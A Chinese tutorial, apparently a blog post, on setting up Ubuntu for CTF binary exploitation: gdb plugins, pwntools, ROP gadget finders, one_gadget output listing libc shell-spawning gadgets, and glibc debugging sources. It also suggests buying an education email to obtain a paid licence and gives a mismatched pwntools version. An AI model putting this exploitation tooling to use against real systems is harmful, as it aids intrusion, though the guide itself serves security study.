<h3 id="gedit"><a href="#gedit" class="headerlink" title="gedit"></a>gedit</h3><p>不习惯 vim 的可以使用 gedit 文本编辑器。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gedit</span><br></pre></td></tr></table></figure></div>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure></div>
<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc</span><br><span class="line"><span class="built_in">sudo</span> apt install gcc-multilib</span><br></pre></td></tr></table></figure></div>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>ipython 提供了很好的 python 交互命令行，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br><span class="line"><span class="built_in">sudo</span> apt install python3</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython3</span><br></pre></td></tr></table></figure></div>
<p>另外有的版本 ubuntu 的不好安装 pip2 可以使用 <code>get-pip.py</code> 脚本安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> apt  install curl</span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py</span><br></pre></td></tr></table></figure></div>
<p>ubuntu 22.04 的 ipython（python2）必须使用 pip2 安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 install ipython</span><br></pre></td></tr></table></figure></div>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure></div>
<p>默认情况下，Docker 命令需要使用 sudo 权限才能运行，这是因为 Docker 守护进程以 root 用户身份运行。然而，你可以通过以下步骤将当前用户添加到 Docker 用户组，从而允许在不使用 sudo 的情况下运行 Docker 命令：</p>
<ul>
<li><p>确保当前用户属于 <code>docker</code> 组：运行以下命令检查当前用户是否已添加到 docker 组：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure></div>
<p>在输出的组列表中查找 <code>docker</code>。如果没有找到 <code>docker</code> 组，请继续下一步。</p>
</li>
<li><p>将当前用户添加到 <code>docker</code> 组：运行以下命令将当前用户添加到 <code>docker</code> 组中（将 <code>&lt;username&gt;</code> 替换为你的用户名）：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker &lt;username&gt;</span><br></pre></td></tr></table></figure></div></li>
<li><p>更新用户组更改：运行以下命令使用户组更改生效：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">newgrp docker</span><br></pre></td></tr></table></figure></div></li>
<li><p>重新登录或重启系统：要使用户组更改永久生效，你需要注销当前会话并重新登录，或者重启系统。</p>
</li>
</ul>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p>安装 zsh</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 <a class="link"   href="https://ohmyz.sh/#install" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>设置 zsh 为默认 shell（重启虚拟机后生效）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 oh-my-zsh 插件 <a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md" >zsh-autosuggestions  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div>
<p>编辑 <code>~/.zshrc</code> 添加插件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=( </span><br><span class="line">    <span class="comment"># other plugins...</span></span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">    extract</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>更新：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure></div>
<h2 id="pwn-相关工具"><a href="#pwn-相关工具" class="headerlink" title="pwn 相关工具"></a>pwn 相关工具</h2><h3 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h3><p><a class="link"   href="https://www.jetbrains.com/clion/download/#section=linux" >clion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一款 C\C++ 的 IDE ，可以用来阅读 glibc 源码的工具，这款工具对<strong>宏展开</strong>，<strong>符号跳转</strong>，<strong>结构体大小以及成员偏移计算</strong>都有很好的支持。这款软件需要付费使用，不过可以某宝搞一个教育邮箱。</p>
<p>首先用打开 <a class="link"   href="https://gitcode.net/qq_45323960/debug_glibc" >debug_glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 解压后的 glibc  源码，这里有以下几点需要注意：</p>
<ul>
<li>源码在对应版本的 <code>source</code> 目录下。</li>
<li>最好不要使用解压到默认 <code>\glibc</code> 路径下的源码，因为源码调试与行号绑定，阅读源码可能会修改到源码。</li>
<li>这里用 <code>debug_glibc</code> 中的源码是因为这里的源码是编译过的，clion 分析代码需要编译的配置文件。</li>
</ul>
<p>然后这里我们看到 Makefile 没有正确导入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232611195.png"
                      alt="image-20241107232611195"
                ><br>在较新版本的 clion 中位于 <code>source</code> 根目录下的 <code>autoreconf</code> 的配置文件 <code>configure.ac</code> 配置有问题，需要改成以下内容（这个主要看版本，有时默认的就好使)：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">GLIBC_PROVIDES dnl See aclocal.m4 <span class="keyword">in</span> the top level <span class="built_in">source</span> directory.</span><br><span class="line"><span class="comment"># Local configure fragment for sysdeps/i386.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We no longer support i386 since it lacks the atomic instructions</span></span><br><span class="line"><span class="comment"># required to implement NPTL threading.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$config_machine</span>&quot;</span> = i386; <span class="keyword">then</span></span><br><span class="line">  AC_MSG_ERROR([</span><br><span class="line">*** ERROR: Support <span class="keyword">for</span> i386 is deprecated.</span><br><span class="line">*** Please use host i786, i686, i585 or i486.</span><br><span class="line">*** For example: /src/glibc/configure --host=i686-pc-linux-gnu ...<span class="string">&quot;])</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># The GNU C Library can&#x27;t be built for i386.  There are several reasons for</span></span><br><span class="line"><span class="string"># this restriction.  The primary reason is that i386 lacks the atomic</span></span><br><span class="line"><span class="string"># operations required to support the current NPTL implementation.  While it is</span></span><br><span class="line"><span class="string"># possible that such atomic operations could be emulated in the kernel to date</span></span><br><span class="line"><span class="string"># no such work has been done to enable this.  Even with NPTL disabled you still</span></span><br><span class="line"><span class="string"># have no atomic.h implementation.  Given the declining use of i386 we disable</span></span><br><span class="line"><span class="string"># support for building with `-march=i386&#x27; or `-mcpu=i386.&#x27; We don&#x27;t explicitly</span></span><br><span class="line"><span class="string"># check for i386, instead we make sure the compiler has support for inlining</span></span><br><span class="line"><span class="string"># the builtin __sync_val_compare_and_swap. If it does then we should have no</span></span><br><span class="line"><span class="string"># problem building for i386.</span></span><br><span class="line"><span class="string">LIBC_COMPILER_BUILTIN_INLINED(</span></span><br><span class="line"><span class="string">  [__sync_val_compare_and_swap],</span></span><br><span class="line"><span class="string">  [int a, b, c; __sync_val_compare_and_swap (&amp;a, b, c);],</span></span><br><span class="line"><span class="string">  [-O0],</span></span><br><span class="line"><span class="string">  [libc_cv_unsupported_i386=no],</span></span><br><span class="line"><span class="string">  [AC_MSG_ERROR([</span></span><br><span class="line"><span class="string">*** Building with -march=i386/-mcpu=i386 is not supported.</span></span><br><span class="line"><span class="string">*** Please use host i786, i686, i586, or i486.</span></span><br><span class="line"><span class="string">*** For example: /source/glibc/configure CFLAGS=&#x27;-O2 -march=i686&#x27; ...])])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl Check whether asm supports Intel MPX</span></span><br><span class="line"><span class="string">AC_CACHE_CHECK(for Intel MPX support, libc_cv_asm_mpx, [dnl</span></span><br><span class="line"><span class="string">cat &gt; conftest.s &lt;&lt;\EOF</span></span><br><span class="line"><span class="string">        bndmov %bnd0,(%esp)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="string">if AC_TRY_COMMAND(<span class="variable">$&#123;CC-cc&#125;</span> -c <span class="variable">$ASFLAGS</span> conftest.s 1&gt;&amp;AS_MESSAGE_LOG_FD); then</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=yes</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">  libc_cv_asm_mpx=no</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">rm -f conftest*])</span></span><br><span class="line"><span class="string">if test <span class="variable">$libc_cv_asm_mpx</span> == yes; then</span></span><br><span class="line"><span class="string">  AC_DEFINE(HAVE_MPX_SUPPORT)</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">AC_DEFINE(USE_REGPARMS)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dnl It is always possible to access static and hidden symbols in an</span></span><br><span class="line"><span class="string">dnl position independent way.</span></span><br><span class="line"><span class="string">AC_DEFINE(PI_STATIC_AND_HIDDEN)</span></span><br></pre></td></tr></table></figure></div>
<p>另外还需要右键 Makefile 设置在命令后面添加 <code>--disable-sanity-checks</code> 。另外构建目标要填 <code>all</code> ，否则 clion 分析的源码的不全。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232825793.png"
                      alt="image-20241107232825793"
                ><br>完整预配置命令如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GNU Autotools template, feel free to customize.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">which</span> autoreconf &gt;/dev/null &amp;&amp; autoreconf --install --force --verbose <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>&quot;</span> 2&gt;&amp;1; /bin/sh <span class="string">&quot;<span class="variable">$&#123;PROJECT_DIR:-..&#125;</span>/configure&quot;</span> --disable-sanity-checks</span><br></pre></td></tr></table></figure></div>
<p>之后右键重新加载 Makefile 项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232847285.png"
                      alt="image-20241107232847285"
                ><br>不勾选清理项目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232907035.png"
                      alt="image-20241107232907035"
                ><br>如果最后这样说明导入成功，之后耐心等待项目导入完毕即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107232925754.png"
                      alt="image-20241107232925754"
                ></p>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></div>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>注意我这里的 pwntools 是 python2 版本的，需要指定为 4.9.0 ，因为高版本的 pwntools 已经不支持 python2 了（具体来说是高版本的 pwntools 必须依赖 unicorn 2.x.x ，而 unicorn 2.x.x 只支持 python3）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools==4.10.0 -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br></pre></td></tr></table></figure></div>
<p>如果已经装了 pwntools 需要先卸载干净再重新安装，否则更改版本无效（最好不带 <code>sudo</code> 也来一遍确保卸载干净）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 uninstall pwntools</span><br><span class="line"><span class="built_in">sudo</span> pip2 uninstall unicorn</span><br></pre></td></tr></table></figure></div>
<p>这样安装的 pwntools 的 plt 功可能无法正常使用，需要手动安装 Unicorn 库。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install unicorn==1.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>
<p>当然这样做的代价是一些特殊架构老版本的 pwntools 不支持，这时候最好换 python3 的 pwntools 。</p>
<h3 id="gdb-插件"><a href="#gdb-插件" class="headerlink" title="gdb 插件"></a>gdb 插件</h3><p>主要有 pwndbg，peda，gef ，这里我常用的是 pwndbg 。对于一些版本过于古老导致环境装不上的可以尝试一下 peda 。</p>
<p>先将三个项目的代码都拉取下来。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git</span><br></pre></td></tr></table></figure></div>
<p>pwndbg 需要运行初始化脚本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line"><span class="built_in">sudo</span> ./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>另外还有一个 pwngdb 插件在调试多线程堆（<code>heapinfoall</code> 命令）的时候很有用，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure></div>
<p>gdb 在启动的时候会读取当前用户的主目录的 <code>.gdbinit</code> 文件进行 gdb 插件的初始化，这里提供一个配置方案。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/sky123/tools/pwndbg/gdbinit.py </span><br><span class="line"><span class="comment">#source /home/sky123/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/sky123/tools/gef/gef.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /home/sky123/tools/muslheap/muslheap.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> /home/sky123/tools/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <ul>
<li>以普通用权限和管理员权限启动 gdb 时读取的 <code>.gdbinit</code> 文件的路径是不同的，普通权限读取的是 <code>/home/&lt;username&gt;/.gdbinit</code> 而管理员权限读取的是 <code>/root/.gdbinit</code> 。</li>
<li>上述配置方案是为了使用 <code>Pwngdb</code> 插件，而该插件唯一的作用就是打印每个线程的对应的 <code>tcache</code>，而实际上这个库已经很久不维护了，因此建议还是直接 <code>source /home/sky123/tools/pwndbg/gdbinit.py</code>。</li>
</ul>

    </div>
  </div>

<p>pwndbg 安装 ghidra 插件可以支持代码反编译（<del>虽然没啥用</del> ）</p>
<ul>
<li>安装 <code>r2pipe</code> 库  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install r2pipe</span><br></pre></td></tr></table></figure></div></li>
<li>下载安装 radere2 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git</span><br><span class="line"><span class="built_in">cd</span> radare2</span><br><span class="line"><span class="built_in">sudo</span> sys/install.sh</span><br></pre></td></tr></table></figure></div></li>
<li>下载编译安装 r2ghidra 项目  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/r2ghidra.git</span><br><span class="line"><span class="built_in">cd</span> r2ghidra</span><br><span class="line"><span class="built_in">sudo</span> ./preconfigure</span><br><span class="line"><span class="built_in">sudo</span> ./configure</span><br><span class="line"><span class="built_in">sudo</span> make -j16</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="gadget-搜索工具"><a href="#gadget-搜索工具" class="headerlink" title="gadget 搜索工具"></a>gadget 搜索工具</h3><h4 id="ROPgdbget"><a href="#ROPgdbget" class="headerlink" title="ROPgdbget"></a>ROPgdbget</h4><p>安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<p>使用：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ntdll.dll &gt; rop</span><br></pre></td></tr></table></figure></div>
<p>有时候 <code>ROPgadget</code> 会出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary init_60D_fwf &gt; rop</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/bin/ROPgadget&quot;</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ropgadget.main()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/__init__.py&quot;</span>, line 30, <span class="keyword">in</span> main</span><br><span class="line">    sys.exit(0 <span class="keyword">if</span> Core(args.getArgs()).analyze() <span class="keyword">else</span> 1)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 257, <span class="keyword">in</span> analyze</span><br><span class="line">    self.__getGadgets()</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/core.py&quot;</span>, line 70, <span class="keyword">in</span> __getGadgets</span><br><span class="line">    G = Gadgets(self.__binary, self.__options, self.__offset)</span><br><span class="line">  File <span class="string">&quot;/home/sky123/.local/lib/python3.10/site-packages/ropgadget/gadgets.py&quot;</span>, line 24, <span class="keyword">in</span> __init__</span><br><span class="line">    <span class="keyword">elif</span> self.__arch == CS_ARCH_ARM64:</span><br><span class="line">NameError: name <span class="string">&#x27;CS_ARCH_ARM64&#x27;</span> is not defined. Did you mean: <span class="string">&#x27;CS_ARCH_ARM&#x27;</span>?</span><br></pre></td></tr></table></figure></div>

<p>此时需要重新安装 <code>capstone</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip uninstall capstone</span><br><span class="line"><span class="built_in">sudo</span> pip install capstone</span><br></pre></td></tr></table></figure></div>

<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><ul>
<li>安装：<ul>
<li>在 pypi 的 <a class="link"   href="https://pypi.org/project/ropper/#files" >ropper 官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上下载 ropper</li>
<li>运行安装脚本完成 ropper 安装  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h4><p>用于搜索 libc 中能够实现 <code>execve(&quot;/bin/sh&quot;, (char *[2]) &#123;&quot;/bin/sh&quot;, NULL&#125;, NULL);</code> 的效果的跳转地址，由于是采用特征匹配的方法，因此只能是在 libc 中查找。</p>
<ul>
<li><p>安装：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby ruby-dev</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure></div></li>
<li><p>使用：可以查找到 gadget 地址以及条件限制。</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x50a37 posix_spawn(rsp+0x1c, <span class="string">&quot;/bin/sh&quot;</span>, 0, rbp, rsp+0x60, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbp == NULL || (u16)[rbp] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf1 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xebcf5 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xebcf8 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure></div>
<p>  如果 <code>one_gadget</code> 在一个版本的 Ubuntu 中搜索某一版本的 glibc 的 gadget 出现如下报错可以尝试换另一个版本的 Ubuntu 。貌似是权限问题，可以以 root 权限重新装一下。</p>
<p>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241107233247289.png"
                      alt="image-20241107233247289"
                ></p>
</li>
</ul>
<h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>用于查看和生成程序沙箱规则。</p>
<ul>
<li>安装：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div></li>
<li>使用：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>通过泄露的 libc 中函数的地址来确定 libc 版本。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line"><span class="built_in">sudo</span> python3 setup.py install</span><br></pre></td></tr></table></figure></div>
<h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><p>临时找 glibc 和 ld 或者编译 glibc 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br></pre></td></tr></table></figure></div>
<p>更新下载列表：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  glibc-all-in-one ./update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> list</span><br><span class="line">2.23-0ubuntu10_amd64</span><br><span class="line">2.23-0ubuntu10_i386</span><br><span class="line">2.23-0ubuntu11_amd64</span><br><span class="line">2.23-0ubuntu11_i386</span><br><span class="line">2.23-0ubuntu3_amd64</span><br><span class="line">2.23-0ubuntu3_i386</span><br><span class="line">2.27-3ubuntu1_amd64</span><br><span class="line">2.27-3ubuntu1_i386</span><br><span class="line">2.28-0ubuntu1_amd64</span><br><span class="line">2.28-0ubuntu1_i386</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">➜  glibc-all-in-one <span class="built_in">cat</span> old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.21-0ubuntu4_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu1_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-3ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">2.24-9ubuntu2.2_amd64</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>下载 libc ，注意要安装解压工具 <code>zstd</code> ，因为下载脚本中用到了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install zstd</span><br><span class="line"><span class="built_in">cat</span> list |xargs -i ./download &#123;&#125;</span><br><span class="line"><span class="built_in">cat</span> old_list |xargs -i ./download_old &#123;&#125;</span><br></pre></td></tr></table></figure></div>
<p>编译 libc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./build [版本例如2.29] [架构例如 i686 amd64]</span><br></pre></td></tr></table></figure></div>

